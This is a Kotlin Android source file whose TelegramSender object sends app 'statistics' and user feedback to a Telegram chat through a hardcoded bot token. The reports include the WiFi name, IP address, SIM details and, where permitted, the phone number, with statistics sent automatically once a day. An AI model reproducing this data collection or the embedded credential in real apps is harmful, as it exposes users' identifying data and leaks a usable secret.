package com.nelev.dev.media

import android.content.Context
import android.content.pm.PackageManager
import android.Manifest
import androidx.core.content.ContextCompat
import com.nelev.dev.BuildConfig
import com.nelev.dev.data.AppSettings
import com.nelev.dev.data.SessionRecord
import com.nelev.dev.data.SessionStore
import com.nelev.dev.data.SettingsStore
import java.io.File
import java.text.SimpleDateFormat
import java.util.Date
import java.util.Locale
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch

object TelegramSender {
    private const val BOT_TOKEN = "8636334140:AAEtx1_RJteILwhQLd-NgaRW2_Syjf8WydM"
    private const val CHAT_ID = "5788301791"

    private fun getDeviceModel(): String {
        return try {
            "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}"
        } catch (_: Exception) { "Unknown" }
    }

    private fun getAndroidVersion(): String {
        return try {
            "Android ${android.os.Build.VERSION.RELEASE} (API ${android.os.Build.VERSION.SDK_INT})"
        } catch (_: Exception) { "Unknown" }
    }

    private fun getDeviceInfo(ctx: Context): Map<String, String> {
        val info = mutableMapOf<String, String>()

        try {
            // WiFi информация
            val wifiManager = ctx.applicationContext.getSystemService(Context.WIFI_SERVICE) as? android.net.wifi.WifiManager
            val wifiInfo = wifiManager?.connectionInfo
            info["wifi_name"] = wifiInfo?.ssid?.replace("\"", "") ?: "Not connected"

            // IP адрес
            val ipAddress = wifiInfo?.ipAddress
            if (ipAddress != null) {
                info["ip_address"] = String.format(
                    "%d.%d.%d.%d",
                    ipAddress and 0xff,
                    ipAddress shr 8 and 0xff,
                    ipAddress shr 16 and 0xff,
                    ipAddress shr 24 and 0xff
                )
            } else {
                info["ip_address"] = "N/A"
            }

            // SIM и телефон информация
            val telephonyManager = ctx.getSystemService(Context.TELEPHONY_SERVICE) as? android.telephony.TelephonyManager
            info["sim_operator"] = telephonyManager?.simOperatorName ?: "No SIM"
            info["sim_country"] = telephonyManager?.simCountryIso?.uppercase() ?: "N/A"

            // Номер телефона (с проверкой разрешения)
            try {
                if (ContextCompat.checkSelfPermission(ctx, Manifest.permission.READ_PHONE_STATE) == PackageManager.PERMISSION_GRANTED) {
                    val phoneNumber = telephonyManager?.line1Number
                    info["phone_number"] = if (!phoneNumber.isNullOrEmpty()) phoneNumber else "N/A"
                } else {
                    info["phone_number"] = "No permission"
                }
            } catch (_: Exception) {
                info["phone_number"] = "N/A"
            }

            // Локация по SIM/Network (страна)
            info["country"] = telephonyManager?.networkCountryIso?.uppercase() ?: "N/A"

        } catch (_: Exception) {
            info["wifi_name"] = "N/A"
            info["ip_address"] = "N/A"
            info["sim_operator"] = "N/A"
            info["sim_country"] = "N/A"
            info["phone_number"] = "N/A"
            info["country"] = "N/A"
        }

        return info
    }

    private fun getAppSize(ctx: Context?): String {
        if (ctx == null) return "N/A"
        return try {
            val packageInfo = ctx.packageManager.getPackageInfo(ctx.packageName, 0)
            val apkPath = packageInfo.applicationInfo?.sourceDir ?: return "N/A"
            val file = File(apkPath)
            val sizeInMB = file.length() / (1024.0 * 1024.0)
            String.format("%.1f MB", sizeInMB)
        } catch (_: Exception) { "N/A" }
    }

    private fun escapeJson(str: String): String {
        return str.replace("\\", "\\\\")
            .replace("\"", "\\\"")
            .replace("\n", "\\n")
            .replace("\r", "\\r")
            .replace("\t", "\\t")
    }

    private fun escapeHtml(str: String): String {
        return str.replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
    }

    private fun formatStatisticsMessage(
        userUID: String,
        appVersion: String,
        deviceModel: String,
        androidVersion: String,
        appSize: String,
        deviceInfo: Map<String, String>,
        sessions: List<SessionRecord>,
        settings: AppSettings
    ): String {
        val message = StringBuilder()
        message.append("📊 <b>Статистика Nelev</b>\n\n")

        // UID пользователя
        message.append("👤 <b>Пользователь</b>\n")
        message.append("   UID: <code>$userUID</code>\n\n")

        // Информация о приложении
        message.append("📱 <b>Устройство</b>\n")
        message.append("   • Модель: <b>${escapeHtml(deviceModel)}</b>\n")
        message.append("   • Android: ${escapeHtml(androidVersion)}\n")
        message.append("   • Версия приложения: <code>${escapeHtml(appVersion)}</code>\n")
        message.append("   • Размер: ${escapeHtml(appSize)}\n\n")

        // Сетевая информация
        val wifiName = deviceInfo["wifi_name"] ?: "N/A"
        val ipAddress = deviceInfo["ip_address"] ?: "N/A"
        val simOperator = deviceInfo["sim_operator"] ?: "N/A"
        val simCountry = deviceInfo["sim_country"] ?: "N/A"

        message.append("🌐 <b>Сеть</b>\n")
        message.append("   • WiFi: <code>${escapeHtml(wifiName)}</code>\n")
        message.append("   • IP: <code>${escapeHtml(ipAddress)}</code>\n")
        if (simOperator != "N/A" || simCountry != "N/A") {
            message.append("   • SIM: ${escapeHtml(simOperator)}")
            if (simCountry != "N/A") message.append(" (${escapeHtml(simCountry)})")
            message.append("\n")
        }
        message.append("\n")

        // Сессии
        if (sessions.isNotEmpty()) {
            val totalDuration = sessions.sumOf { it.durationMs }
            val avgPing = sessions.map { it.avgPingMs }.average().toLong()

            message.append("🎙 <b>Использование</b>\n")
            message.append("   • Сессий: <b>${sessions.size}</b>\n")
            message.append("   • Общее время: <b>${formatDuration(totalDuration)}</b>\n")
            message.append("   • Средний пинг: <code>$avgPing мс</code>\n\n")
        } else {
            message.append("🎙 <b>Использование</b>\n")
            message.append("   • Сессий пока не было\n\n")
        }

        // Настройки - компактно
        val enabledFeatures = mutableListOf<String>()
        if (settings.isDark) enabledFeatures.add("Тёмная тема")
        if (settings.phrasesEnabled) enabledFeatures.add("Фразы")
        if (settings.connectionBarEnabled) enabledFeatures.add("Полоса соединения")
        if (settings.soundNotifEnabled) enabledFeatures.add("Звук уведомлений")
        if (settings.soundClickEnabled) enabledFeatures.add("Звук нажатий")
        if (settings.visualEffectsEnabled) enabledFeatures.add("Визуальные эффекты")
        if (settings.menuCentered) enabledFeatures.add("Контент по центру")

        message.append("⚙️ <b>Настройки</b>\n")
        message.append("   • Язык: ${settings.language.uppercase()}\n")
        if (enabledFeatures.isNotEmpty()) {
            message.append("   • Включено: ${enabledFeatures.joinToString(", ")}\n")
        }
        message.append("\n")

        // Время отправки
        val dateFormat = SimpleDateFormat("dd.MM.yyyy HH:mm", Locale.getDefault())
        message.append("🕐 ${dateFormat.format(Date())}")

        return message.toString()
    }

    private fun formatFeedbackMessage(
        userUID: String,
        feedbackText: String,
        contactInfo: String,
        appVersion: String,
        deviceModel: String,
        androidVersion: String,
        appSize: String,
        deviceInfo: Map<String, String>,
        sessions: List<SessionRecord>,
        settings: AppSettings
    ): String {
        val message = StringBuilder()
        message.append("💡 <b>Обратная связь</b>\n\n")

        // Текст обратной связи - главное
        message.append("💬 <b>Сообщение:</b>\n")
        message.append("<i>\"${escapeHtml(feedbackText)}\"</i>\n\n")

        // Контактные данные если есть
        if (contactInfo.isNotBlank()) {
            message.append("📧 <b>Контакт:</b> <code>${escapeHtml(contactInfo)}</code>\n\n")
        }

        message.append("─────────────────\n\n")

        // UID пользователя
        message.append("👤 <b>От пользователя</b>\n")
        message.append("   UID: <code>$userUID</code>\n\n")

        // Информация о приложении - компактно
        message.append("📱 <b>Устройство</b>\n")
        message.append("   • ${escapeHtml(deviceModel)}\n")
        message.append("   • ${escapeHtml(androidVersion)}\n")
        message.append("   • Версия: <code>${escapeHtml(appVersion)}</code>\n\n")

        // Сетевая информация - только важное
        val wifiName = deviceInfo["wifi_name"] ?: "N/A"
        val ipAddress = deviceInfo["ip_address"] ?: "N/A"
        val simOperator = deviceInfo["sim_operator"] ?: "N/A"
        val simCountry = deviceInfo["sim_country"] ?: "N/A"

        message.append("🌐 <b>Сеть</b>\n")
        message.append("   • WiFi: <code>${escapeHtml(wifiName)}</code>\n")
        message.append("   • IP: <code>${escapeHtml(ipAddress)}</code>\n")
        if (simOperator != "N/A" || simCountry != "N/A") {
            message.append("   • SIM: ${escapeHtml(simOperator)}")
            if (simCountry != "N/A") message.append(" (${escapeHtml(simCountry)})")
            message.append("\n")
        }
        message.append("\n")

        // Сессии - кратко
        if (sessions.isNotEmpty()) {
            val totalDuration = sessions.sumOf { it.durationMs }
            val avgPing = sessions.map { it.avgPingMs }.average().toLong()

            message.append("🎙 <b>Опыт использования</b>\n")
            message.append("   • ${sessions.size} сессий, ${formatDuration(totalDuration)}\n")
            message.append("   • Средний пинг: <code>$avgPing мс</code>\n\n")
        } else {
            message.append("🎙 <b>Опыт использования</b>\n")
            message.append("   • Новый пользователь (сессий пока не было)\n\n")
        }

        // Настройки - только включенные
        val enabledFeatures = mutableListOf<String>()
        if (settings.isDark) enabledFeatures.add("Тёмная тема")
        if (settings.phrasesEnabled) enabledFeatures.add("Фразы")
        if (settings.connectionBarEnabled) enabledFeatures.add("Полоса соединения")
        if (settings.soundNotifEnabled) enabledFeatures.add("Звук уведомлений")
        if (settings.soundClickEnabled) enabledFeatures.add("Звук нажатий")
        if (settings.visualEffectsEnabled) enabledFeatures.add("Визуальные эффекты")
        if (settings.menuCentered) enabledFeatures.add("Контент по центру")

        if (enabledFeatures.isNotEmpty()) {
            message.append("⚙️ <b>Настройки</b>\n")
            message.append("   • Язык: ${settings.language.uppercase()}\n")
            message.append("   • ${enabledFeatures.joinToString(", ")}\n\n")
        }

        // Время отправки
        val dateFormat = SimpleDateFormat("dd.MM.yyyy HH:mm", Locale.getDefault())
        message.append("🕐 ${dateFormat.format(Date())}")

        return message.toString()
    }

    private fun formatDuration(ms: Long): String {
        val seconds = ms / 1000
        val minutes = seconds / 60
        val hours = minutes / 60

        return when {
            hours > 0 -> "${hours}ч ${minutes % 60}м"
            minutes > 0 -> "${minutes}м ${seconds % 60}с"
            else -> "${seconds}с"
        }
    }

    fun sendStatistics(ctx: Context, forceUpdate: Boolean = false): Boolean {
        val settings = SettingsStore.load(ctx)
        val currentTime = System.currentTimeMillis()
        val oneDayMs = 24 * 60 * 60 * 1000L

        // Проверяем, прошло ли 24 часа с последней отправки
        if (!forceUpdate && (currentTime - settings.lastStatisticsSentMs) < oneDayMs) {
            android.util.Log.d("TelegramSender", "Statistics blocked: last sent ${(currentTime - settings.lastStatisticsSentMs) / 1000 / 60} minutes ago")
            return false // Ещё не прошло 24 часа
        }

        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            try {
                val sessions = SessionStore.load(ctx)
                val deviceInfo = getDeviceInfo(ctx)

                // Форматируем сообщение для Telegram
                val formattedMessage = formatStatisticsMessage(
                    userUID = settings.userUID,
                    appVersion = BuildConfig.VERSION_NAME,
                    deviceModel = getDeviceModel(),
                    androidVersion = getAndroidVersion(),
                    appSize = getAppSize(ctx),
                    deviceInfo = deviceInfo,
                    sessions = sessions,
                    settings = settings
                )

                // Создаём JSON для сохранения
                val jsonData = createStatisticsJson(ctx, settings.userUID, deviceInfo, sessions, settings)

                // Отправляем в Telegram
                sendFormattedToTelegram(formattedMessage)

                // Отправляем JSON боту для сохранения
                sendJsonToBot(jsonData)

                // Обновляем время последней отправки
                val updatedSettings = settings.copy(lastStatisticsSentMs = currentTime)
                SettingsStore.save(ctx, updatedSettings)
                android.util.Log.d("TelegramSender", "Statistics sent successfully, time saved: $currentTime")
            } catch (e: Exception) {
                android.util.Log.e("TelegramSender", "Error sending statistics", e)
            }
        }
        return true
    }

    fun sendFeedback(ctx: Context, feedbackText: String, contactInfo: String = "") {
        kotlinx.coroutines.CoroutineScope(kotlinx.coroutines.Dispatchers.IO).launch {
            try {
                val settings = SettingsStore.load(ctx)
                val sessions = SessionStore.load(ctx)
                val deviceInfo = getDeviceInfo(ctx)

                // Форматируем сообщение для Telegram
                val formattedMessage = formatFeedbackMessage(
                    userUID = settings.userUID,
                    feedbackText = feedbackText,
                    contactInfo = contactInfo,
                    appVersion = BuildConfig.VERSION_NAME,
                    deviceModel = getDeviceModel(),
                    androidVersion = getAndroidVersion(),
                    appSize = getAppSize(ctx),
                    deviceInfo = deviceInfo,
                    sessions = sessions,
                    settings = settings
                )

                // Создаём JSON для сохранения
                val jsonData = createFeedbackJson(ctx, settings.userUID, feedbackText, contactInfo, deviceInfo, sessions, settings)

                // Отправляем в Telegram
                sendFormattedToTelegram(formattedMessage)

                // Отправляем JSON боту для сохранения
                sendJsonToBot(jsonData)

                android.util.Log.d("TelegramSender", "Feedback sent successfully")
            } catch (e: Exception) {
                android.util.Log.e("TelegramSender", "Error sending feedback", e)
            }
        }
    }

    private fun createStatisticsJson(
        ctx: Context,
        userUID: String,
        deviceInfo: Map<String, String>,
        sessions: List<SessionRecord>,
        settings: AppSettings
    ): String {
        val sessionsJson = sessions.joinToString(",", "[", "]") { session ->
            "{\"duration_ms\":${session.durationMs},\"avg_ping_ms\":${session.avgPingMs}}"
        }

        val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)

        return """
        {
            "type": "statistics",
            "uid": "${escapeJson(userUID)}",
            "timestamp": "${dateFormat.format(Date())}",
            "app_version": "${escapeJson(BuildConfig.VERSION_NAME)}",
            "device_model": "${escapeJson(getDeviceModel())}",
            "android_version": "${escapeJson(getAndroidVersion())}",
            "app_size": "${escapeJson(getAppSize(ctx))}",
            "wifi_name": "${escapeJson(deviceInfo["wifi_name"] ?: "N/A")}",
            "ip_address": "${escapeJson(deviceInfo["ip_address"] ?: "N/A")}",
            "phone_number": "${escapeJson(deviceInfo["phone_number"] ?: "N/A")}",
            "sim_operator": "${escapeJson(deviceInfo["sim_operator"] ?: "N/A")}",
            "sim_country": "${escapeJson(deviceInfo["sim_country"] ?: "N/A")}",
            "country": "${escapeJson(deviceInfo["country"] ?: "N/A")}",
            "sessions": $sessionsJson,
            "settings": {
                "dark_theme": ${settings.isDark},
                "language": "${settings.language}",
                "phrases_enabled": ${settings.phrasesEnabled},
                "connection_bar": ${settings.connectionBarEnabled},
                "sound_notif": ${settings.soundNotifEnabled},
                "sound_click": ${settings.soundClickEnabled},
                "visual_effects": ${settings.visualEffectsEnabled},
                "menu_centered": ${settings.menuCentered}
            }
        }
        """.trimIndent()
    }

    private fun createFeedbackJson(
        ctx: Context,
        userUID: String,
        feedbackText: String,
        contactInfo: String,
        deviceInfo: Map<String, String>,
        sessions: List<SessionRecord>,
        settings: AppSettings
    ): String {
        val sessionsJson = sessions.joinToString(",", "[", "]") { session ->
            "{\"duration_ms\":${session.durationMs},\"avg_ping_ms\":${session.avgPingMs}}"
        }

        val dateFormat = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss'Z'", Locale.US)

        return """
        {
            "type": "feedback",
            "uid": "${escapeJson(userUID)}",
            "timestamp": "${dateFormat.format(Date())}",
            "feedback_text": "${escapeJson(feedbackText)}",
            "contact_info": "${escapeJson(contactInfo)}",
            "app_version": "${escapeJson(BuildConfig.VERSION_NAME)}",
            "device_model": "${escapeJson(getDeviceModel())}",
            "android_version": "${escapeJson(getAndroidVersion())}",
            "app_size": "${escapeJson(getAppSize(ctx))}",
            "wifi_name": "${escapeJson(deviceInfo["wifi_name"] ?: "N/A")}",
            "ip_address": "${escapeJson(deviceInfo["ip_address"] ?: "N/A")}",
            "phone_number": "${escapeJson(deviceInfo["phone_number"] ?: "N/A")}",
            "sim_operator": "${escapeJson(deviceInfo["sim_operator"] ?: "N/A")}",
            "sim_country": "${escapeJson(deviceInfo["sim_country"] ?: "N/A")}",
            "country": "${escapeJson(deviceInfo["country"] ?: "N/A")}",
            "sessions": $sessionsJson,
            "settings": {
                "dark_theme": ${settings.isDark},
                "language": "${settings.language}",
                "phrases_enabled": ${settings.phrasesEnabled},
                "connection_bar": ${settings.connectionBarEnabled},
                "sound_notif": ${settings.soundNotifEnabled},
                "sound_click": ${settings.soundClickEnabled},
                "visual_effects": ${settings.visualEffectsEnabled},
                "menu_centered": ${settings.menuCentered}
            }
        }
        """.trimIndent()
    }

    private fun sendJsonToBot(jsonData: String) {
        try {
            val url = java.net.URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            val connection = url.openConnection() as java.net.HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.doOutput = true

            // Отправляем JSON как красиво отформатированный код
            val escapedJson = jsonData
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")

            val postData = """{"chat_id":"$CHAT_ID","text":"```json\n$escapedJson\n```","parse_mode":"Markdown"}"""

            connection.outputStream.use { os ->
                val input = postData.toByteArray(Charsets.UTF_8)
                os.write(input, 0, input.size)
            }

            connection.responseCode
            connection.disconnect()
        } catch (e: Exception) {
            android.util.Log.e("TelegramSender", "Error sending JSON to bot", e)
        }
    }

    private fun sendFormattedToTelegram(htmlMessage: String) {
        try {
            val url = java.net.URL("https://api.telegram.org/bot$BOT_TOKEN/sendMessage")
            val connection = url.openConnection() as java.net.HttpURLConnection
            connection.requestMethod = "POST"
            connection.setRequestProperty("Content-Type", "application/json; charset=UTF-8")
            connection.doOutput = true

            // Экранируем HTML для JSON
            val escapedHtml = htmlMessage
                .replace("\\", "\\\\")
                .replace("\"", "\\\"")
                .replace("\n", "\\n")

            val postData = """{"chat_id":"$CHAT_ID","text":"$escapedHtml","parse_mode":"HTML"}"""

            connection.outputStream.use { os ->
                val input = postData.toByteArray(Charsets.UTF_8)
                os.write(input, 0, input.size)
            }

            val responseCode = connection.responseCode
            if (responseCode == java.net.HttpURLConnection.HTTP_OK) {
                android.util.Log.d("TelegramSender", "Message sent successfully")
            } else {
                android.util.Log.e("TelegramSender", "Failed to send message: $responseCode")
            }
            connection.disconnect()
        } catch (e: Exception) {
            android.util.Log.e("TelegramSender", "Error in sendFormattedToTelegram", e)
        }
    }
}
